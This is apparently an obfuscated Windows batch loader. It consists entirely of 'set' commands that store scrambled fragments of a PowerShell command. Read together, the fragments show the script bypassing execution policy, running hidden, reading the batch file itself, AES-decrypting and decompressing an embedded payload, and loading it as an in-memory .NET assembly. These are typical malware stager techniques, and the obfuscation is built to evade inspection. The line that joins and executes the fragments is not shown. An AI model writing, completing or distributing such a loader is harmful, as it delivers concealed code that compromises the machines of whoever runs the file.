@echo off
set "dUgvLeaQbE=[]] "
set "zRoidNbkbb= [Sy"
set "LkfKuJXanz=pose"
set "iwkNLInSvN=raph"
set "zSbsutILYF=z = "
set "jPqsmqluCr=bjec"
set "VCZyiIwvlT=ress"
set "ZNpwGIpliU=ck($"
set "RRbfMzwlrI=RmAx"
set "HPyRcxtIjh=]::("
set "wavuRuOeBB=.IO."
set "gVfNKHJLPm=nage"
set "zzBRrQrpqC=trea"
set "wSlNGqOWXN=.Dis"
set "YhOpJlbHiT=g = "
set "NnbqRRNUIO=esMa"
set "nBrZMtABVN=vert"
set "wFajkYKKFg=Fnes"
set "YPNRtLYsrt=;$hy"
set "LRNwvPsPoR=n ''"
set "EnHjdeJabN=urit"
set "VGEdiQKtae=Fina"
set "HbYurIFAUJ=y]::"
set "vcWolFDCYd=pose"
set "ASsAHBXOMx=oL'["
set "LysqbiEZiV=ode]"
set "RMQMoebzaY= New"
set "BwlgovDakU=em.I"
set "ofAYqTRkTv=fB);"
set "EciaGiwZeE=em.C"
set "nvpZaCrslI=('da"
set "UyGWiEapJN=Obje"
set "bqYmVwjwOw=Wvt."
set "WaneBVPuFd=ing("
set "hCkNhkOYQS=Syst"
set "tsbkmCFBYx=.Mem"
set "URDEkyYioU=fB ="
set "ULOimaDaHx=gnir"
set "eDUFDSlLva=OP ="
set "kVlHBPLzbc=ispo"
set "BfYhdSFkLn=ateD"
set "CiAnPSNkPG= = $"
set "RwkpZJlcLS=  $m"
set "KExsokAFvI=)) {"
set "mnanGPOKIR=qmVQ"
set "fWvJQUYflI=);$D"
set "lhnIRlhpYb=pher"
set "yPfCOZjxtM=y.Ci"
set "sXNBsKiwaV=comm"
set "ydWvNgecTv=rtS4"
set "HDzFyLRykM=L4Yi"
set "tPQoPTfTGC=gjYA"
set "fviJzRDluq='0Pg"
set "PlgbRNmqEC=('%~f0'"
set "UvEwFdktfb=pStr"
set "onRwVVCguz=comp"
set "HCFhYlJLtD=ress"
set "KAwgeAZEfq=hy.A"
set "GgkQFQVajJ=ionM"
set "TGYljaEPqy=Secu"
set "RqRDjNfyPv=morF"
set "zsdylaplew=ewLi"
set "AbvtmmUEdR=::De"
set "hjusdIrQCp=-joi"
set "bHQAJPJOIU=t Sy"
set "TVEwNxEgic==');"
set "eEJVIZxXiT=P) {"
set "pxXlRzPNNI=ring"
set "izLetFVnpz=w = "
set "LpNfWpHxDS=y.Cr"
set "ksrWcXnWyY=.Key"
set "qzIiDpgzAa=s.Pa"
set "EuArqHvHrs=tem."
set "otIFBPdplx=Fnes"
set "UcjxlUjJVP=Fnes"
set "GYOQJUvZzz=ptog"
set "kLBcDajUUG=$Dqm"
set "dUCFKyOiId=Conv"
set "LVOTuLhjPo=ose("
set "IeIPSywdBv=Obje"
set "RHjEKEeIXA=);$X"
set "cNCwslcFYw='gni"
set "QyeXNWfZKF=ne);"
set "VfGsWTNQqd=[Sys"
set "ruZzOpllXz=gsYZ"
set "wtYOKcjgWZ=iron"
set "yRDyelJFUm=; };"
set "lvubFACbXU=esaB"
set "ZwsoRFRCDK=HDWj"
set "jPqtulowjX=[Sys"
set "uMetCixLUW=1..-"
set "KpTsrtVtZa=mhHZ"
set "zUGbwUaDgn=ert]"
set "VwKvqlyLTb=join"
set "OMANBoXOVo=ypto"
set "bLHUdxVBmF=();$"
set "jCxrSHCBnP=m(, "
set "BtGNUHiDOS=rt]:"
set "oALmUvFKpS=form"
set "UNzPxsSfSA=gpQf"
set "qGdmHLJsSd=Comp"
set "kpkvnDWmef=$Dqm"
set "qgFcfsoTng=lBlo"
set "pOyNuAFybO=ZkLO"
set "oSKaohUIhB=B, 0"
set "YpWNuZDjXc=oArr"
set "tTCkDvHHhl=ct S"
set "WQjWLZkaMO=eMVs"
set "RQPsRnENmz=tsWi"
set "aSsxvrMpwR=in $"
set "oJaBFJpKfM=();$"
set "UqskGhpNQv=('%*'"
set "toZPzZFbWc=lit("
set "fuDWNqMgEl=oryS"
set "xkDdRRJcFB=th('"
set "NlSPVVYkfp=VQ ="
set "wcmOwkjMIm=.Dis"
set "UyeweVhPMj=ecry"
set "deFcpJnXPJ=grap"
set "cSlvPSVEzW=ddin"
set "JVrakZzvOn=ct S"
set "bKIsZQGEQL=;$hy"
set "RoOSocFgiD=e = "
set "YwiaqYmKfF=rans"
set "orXKfFrbJC=yste"
set "gtAzVvkMUx=pres"
set "mDPszTtVZz=Lvz."
set "VABnCmZBpP=tem."
set "jWgHWCiGBP=rity"
set "dcwoFhTORn=16] "
set "oydAKiQEUz=-1.."
set "agUtSLWsyV='[-1"
set "UPgDJIzXQb=Star"
set "YAXRNWiyuW=tryP"
set "LXFMnbiBVz=BC;$"
set "OxTDflxucU=$hyr"
set "aTklvSCaZT=saBm"
set "fchxXbhpTW=B = "
set "lYjbuacMGs=tion"
set "HOBoKqiVsk=m.Re"
set "nxRbJQyuwU=YxVw"
set "VhGITzrNCL=..-1"
set "fMAuPcmLcu=ect "
set "WrXrvyHWvg=ajcw"
set "VJbUhGJGev=tem."
set "rjLTrTndYq=V = "
set "VHeEDyzxhj=Syst"
set "vnJsQoJhSh=VQ.T"
set "gVubSUfcVV=pQfB"
set "uiwhmnXILi===')"
set "FEJgnsaXRa=brea"
set "MYmnolubuL=-4] "
set "TcjMESFtaF=.-16"
set "UecOjJXVWR=eam("
set "gMxiThrhwz=, $g"
set "qdHXJObJnf=fLWv"
set "TyovdtaGYq=gpQf"
set "XFKxqdRpxq=..-1"
set "HUMIhOifUF=[Env"
set "TJcUuhDfxb=-nop"
set "rhlpfijpfQ=ress"
set "qQmOBAiRca=G.En"
set "QQrAqkvvfY=S46e"
set "DhoxPTxgmB=3); "
set "kmZmPhLwmZ=:: '"
set "hHpBXtIOJJ= if "
set "FtKdtaQSCp=Disp"
set "MjYtwwdrwk=dj0C"
set "stqLuHBErt=daeR"
set "TerojGJCdQ=PKCS"
set "IvknIIMSJD=rKm "
set "ANVgCvEftz=7;$X"
set "XOtBVHyYeI=).Sp"
set "wsVdWQWkds=('Tg"
set "ooHAjnuZDz=PxEW"
set "dKuTpknabt=PTtG"
set "MMyMWBGemv=)($g"
set "UWKPanUAxL='')("
set "qFHqNjasjh=ay()"
set "WLQDcMIDnD=e]::"
set "qEBrMcZFzD=$gpQ"
set "BwGKOONSak=rofi"
set "aOUPJSPFsV=le  "
set "WRZWIjCnuf=($fL"
set "viLCSNcKiN=New-"
set "VglRJogThd=.Cry"
set "QNJcFvLFiG=.Sec"
set "AyywYJEKEQ=);$X"
set "RiwqEOVnve=B = "
set "saxMYCRJOP=HZG "
set "QZmNLKLTSM=bypa"
set "kcXuWQHjBf= = N"
set "BRDdxlaxTH=fore"
set "AjaNShdohz=.Len"
set "fEhnEaUAQI=tS46"
set "RfcdmYYizE=.Cre"
set "LQEwyzVPFs=nirt"
set "mJOQvzCDBU=, (,"
set "lzXOqemQFu=n ''"
set "fDUtuDAHyA=zHhH"
set "sUnnqkDuOF=ddin"
set "HKbuoWMEJf=embl"
set "GKDycEKQEs=);$f"
set "AtReNVkPSy=);$B"
set "hjhcGgJJPk=Mode"
set "JRnkKTQeiV=-ep "
set "AecubXLKqL=rKm."
set "SfjgjUuGSe=k; }"
set "BpSWODIyKi= [Sy"
set "mtDejeOnkC=ss -"
set "CnPJjGoYoG=.Con"
set "cnaLxoyoTh=)($m"
set "IvcFPevkFR=stem"
set "yBdMGPNDdQ=6] -"
set "PQMcxRdQRf=File"
set "CvCMhVBZJl=ptog"
set "PoCeVUWCfC=cw.D"
set "ecZXMTtEsc=Disp"
set "bsXVeRsOHI=;$mh"
set "tvROmkrMpT=HDWj"
set "kxYcCSEUaX=Invo"
set "lbmfbJgvNY=($fL"
set "FyEIDtPfod=.Cop"
set "vJptyrcHtc=Fnes"
set "xKTaweRWlV=m.IO"
set "zlAhTbAivz=am;$"
set "ZMjLMZdhqh=ptor"
set "bNXaqmivZR=Comp"
set "BtlIzNmAmV=[Sys"
set "iEksJQwMDB= = $"
set "QCHSHMITvr= '')"
set "jDsAIQHxqf=::('"
set "iltBUdbLuh=]::N"
set "pgePAzPXOg=]::("
set "pMouByJZIY=Fnes"
set "WVPMcLDpWF=] -j"
set "iIHuiOtYGp=onve"
set "FjMmECiHuG=$SKL"
set "bFkHFajshn=gMod"
set "eQcHFymKaO=SKLv"
set "QrHSEatfdj=-Obj"
set "tYcKfIVWAh=bstr"
set "JdTtEBTyft='txe"
set "VIKuanmiBI=t.Su"
set "dFymlDJstq=yTo("
set "mcAVrmZFcf=fajc"
set "RpwFdjmdof=mory"
set "DRqDMGPoMb=New-"
set "TlIHCqUxkT=vz, "
set "OxwTuTYmyf= [st"
set "DypfTlvqHA=zuZI"
set "iaycqAxOHs=Km.T"
set "BnTZlifUUJ=VQ);"
set "oqUqLPBINb=ose("
set "bPNZzEcxHv=y.Pa"
set "RrjhDAYUHA=Bmor"
